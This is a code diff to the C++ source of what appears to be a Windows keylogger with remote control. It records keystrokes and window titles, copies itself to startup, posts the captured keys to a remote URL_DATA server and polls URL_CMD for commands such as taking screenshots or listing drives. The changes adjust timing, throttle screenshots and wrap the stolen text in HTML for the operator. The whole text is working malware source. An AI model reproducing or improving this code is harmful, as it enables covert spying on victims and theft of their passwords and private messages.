@@ -28,7 +28,9 @@
 using namespace std;
 namespace fs = experimental::filesystem;
 // Global Variable
-int UPDATE_PERIOD = 500;
+int UPDATE_PERIOD = 1000;
+char CAPTURE_PERIOD = 1;
+char capture_count = 0;
 
 // FUNCTION
 void copy_to_startup();
@@ -94,13 +96,14 @@ int main()
 		count++;
 		if (count>UPDATE_PERIOD) {
 			count = 0;
+			cmd = "";
 			// Send Key data to server
 			if (!key_data.empty()) {
 #ifdef CONSOLE_LOG
 				std::printf("SEND KEY DATA\n");
 #endif
 				cmd = curl_post(key_data.c_str(), URL_DATA);
-				key_data.clear();
+				//key_data.clear();
 				key_data = "";
 			}else {
 				cmd = get_html(URL_CMD);
@@ -109,7 +112,6 @@ int main()
 #endif
 			}
 			execute_command(cmd);
-			cmd = "";
 		}
 
 		HWND hwndHandle = GetForegroundWindow();
@@ -130,11 +132,12 @@ int main()
 #endif
 				/* Send data to server */
 				string send_title = get_utf8(title);
-				send_title[send_title.length() - 1] = '\n';
-				send_title = "\n********************\n" + send_title + "********************\n";
+				send_title[send_title.length() - 1] = ' ';
+				send_title = "</div>\n<div class='title'>" + send_title + "</div>\n<div class='key'>";
 				key_data = key_data + send_title;
 				/* clear title */
-				send_title.clear();
+				send_title = "";
+				//send_title.clear();
 			}
 			// update last title			
 			for (int i = 0; i < 1024; i++) {
@@ -366,6 +369,12 @@ int execute_command(string cmd) {
 
 	// Screenshot
 	if (cmd.compare("screenshot")==0) {
+		capture_count++;
+		if (capture_count >= CAPTURE_PERIOD) {
+			capture_count = 0;
+			return 0;
+		}
+
 		WCHAR temp_path[MAX_PATH];
 		get_temp_path(temp_path, MAX_PATH, _T("tmp.png"));
 		HRESULT res = CaptureScreen(temp_path);
@@ -400,13 +409,13 @@ int execute_command(string cmd) {
 		string period = cmd.substr(offset, cmd.length() - 3);
 		int time = atoi(period.c_str());
 		time = time / 10;
-		if (time<200)
+		if (time<300)
 		{
-			time = 500;
+			time = 300;
 		}
 		UPDATE_PERIOD = time;
 		// ascii dir
-		curl_post("Update period (ms) = " + to_string(UPDATE_PERIOD), URL_CMD);
+		curl_post("Update period (ms) = " + to_string(UPDATE_PERIOD*10), URL_CMD);
 		return 0;
 	}
 
@@ -626,7 +635,7 @@ int print_drivers()
 		printf("%S", driveStrings);
 		wstring ws(driveStrings);
 		all_driver = all_driver + string(ws.begin(), ws.end());
-		ws.clear();
+		ws=L"";
 		// Move to next drive string
 		// +1 is to move past the null at the end of the string.
 		driveStrings += lstrlen(driveStrings) + 1;
